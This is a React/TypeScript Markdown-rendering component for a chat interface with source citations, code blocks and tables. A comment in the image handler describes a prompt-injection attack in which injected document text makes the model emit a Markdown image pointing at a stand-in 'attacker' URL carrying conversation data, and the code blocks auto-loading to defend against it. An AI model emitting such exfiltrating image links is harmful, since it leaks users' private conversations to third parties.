import { Check, Copy, Terminal } from 'lucide-react';
import { memo, useState, type ReactNode } from 'react';
import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { linkifyCitations } from '../lib/rag/citations';
import type { SourceRef } from '../lib/types';

function CodeBlock({ lang, code }: { lang: string; code: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    void navigator.clipboard.writeText(code).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  };
  return (
    <div className="not-prose my-4 overflow-hidden rounded-lg border border-gray-800 bg-gray-950">
      <div className="flex items-center justify-between border-b border-gray-800 bg-gray-900 px-3 py-1.5">
        <span className="flex items-center gap-1.5 font-mono text-[11px] tracking-wider text-gray-400 uppercase">
          <Terminal size={12} className="text-accent-400" />
          {lang || 'code'}
        </span>
        <button onClick={copy} className="flex items-center gap-1 text-[11px] text-gray-400 hover:text-white">
          {copied ? <Check size={12} /> : <Copy size={12} />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre className="scrollbar-thin overflow-x-auto p-4 font-mono text-[13px] leading-relaxed text-gray-200">
        <code>{code}</code>
      </pre>
    </div>
  );
}

interface MarkdownProps {
  content: string;
  /** Number of citable sources; [n] markers up to this become chips. */
  sourceCount?: number;
  onCite?: (n: number) => void;
  citeTitle?: (n: number) => string;
  /** The passage behind a citation, shown in a card while the chip is hovered or focused. */
  citeSource?: (n: number) => SourceRef | undefined;
  /** The answer is still being written: new blocks animate in and a cursor trails the text. */
  streaming?: boolean;
}

export const Markdown = memo(function Markdown({ content, sourceCount = 0, onCite, citeTitle, citeSource, streaming = false }: MarkdownProps) {
  const components: Components = {
    pre: ({ children }) => <>{children}</>,
    code: ({ className, children }) => {
      const text = String(children as ReactNode);
      const lang = /language-([\w-]+)/.exec(className ?? '')?.[1];
      if (lang || text.includes('\n')) return <CodeBlock lang={lang ?? ''} code={text.replace(/\n$/, '')} />;
      return <code className="rounded bg-gray-100 px-1.5 py-0.5 font-mono text-[0.88em] text-accent-700 before:content-none after:content-none dark:bg-white/10 dark:text-accent-300">{children}</code>;
    },
    a: ({ href, children }) => {
      if (href?.startsWith('#cite-')) {
        const n = Number(href.slice(6));
        const src = citeSource?.(n);
        const meta = src ? [src.headingPath.join(' › '), src.page ? `p. ${src.page}` : ''].filter(Boolean).join(' · ') : '';
        return (
          <span className="group/cite relative inline-block">
            <button type="button" className="cite-chip" onClick={() => onCite?.(n)} title={src ? undefined : citeTitle?.(n)} aria-label={`Open source ${n}`}>
              {n}
            </button>
            {src && (
              <span
                role="tooltip"
                className="not-prose pointer-events-none invisible absolute bottom-full left-1/2 z-30 mb-2 block w-72 -translate-x-1/2 translate-y-1 rounded-xl border border-line bg-raised p-3 text-left text-xs leading-relaxed text-ink opacity-0 shadow-xl transition duration-150 group-focus-within/cite:visible group-focus-within/cite:translate-y-0 group-focus-within/cite:opacity-100 group-hover/cite:visible group-hover/cite:translate-y-0 group-hover/cite:opacity-100"
              >
                <span className="flex items-center gap-1.5">
                  <span className="cite-chip pointer-events-none">{n}</span>
                  <span className="min-w-0 truncate font-bold">{src.docName}</span>
                </span>
                {meta && <span className="mt-0.5 block truncate text-[11px] text-muted">{meta}</span>}
                <span className="mt-1.5 line-clamp-5 block text-muted">{src.text}</span>
                <span className="mt-1.5 block text-[11px] font-semibold text-accent-700 dark:text-accent-300">Click to open the passage</span>
              </span>
            )}
          </span>
        );
      }
      return (
        <a href={href} target="_blank" rel="noopener noreferrer" className="text-accent-600 hover:underline dark:text-accent-400">
          {children}
        </a>
      );
    },
    // Never auto-load images from model output: text injected into a document could make the
    // model emit ![](https://attacker/?q=...) and leak the conversation. Show a plain link instead.
    img: ({ src, alt }) =>
      typeof src === 'string' && /^https?:\/\//i.test(src) ? (
        <a href={src} target="_blank" rel="noopener noreferrer" className="text-accent-600 hover:underline dark:text-accent-400">
          {alt ? `Image: ${alt}` : 'Image link'}
        </a>
      ) : null,
    table: ({ children }) => (
      <div className="scrollbar-thin my-4 overflow-x-auto rounded-lg border border-gray-200 dark:border-gray-800">
        <table className="my-0 w-full text-sm">{children}</table>
      </div>
    ),
  };

  return (
    <div
      className={`prose prose-sm prose-gray dark:prose-invert prose-headings:font-display prose-headings:font-extrabold prose-headings:tracking-tight prose-h1:text-2xl prose-h2:text-xl prose-h3:text-lg prose-p:leading-relaxed prose-li:my-0.5 max-w-none text-[15px] break-words${streaming ? ' answer-streaming' : ''}`}
    >
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {linkifyCitations(content, sourceCount)}
      </ReactMarkdown>
    </div>
  );
});
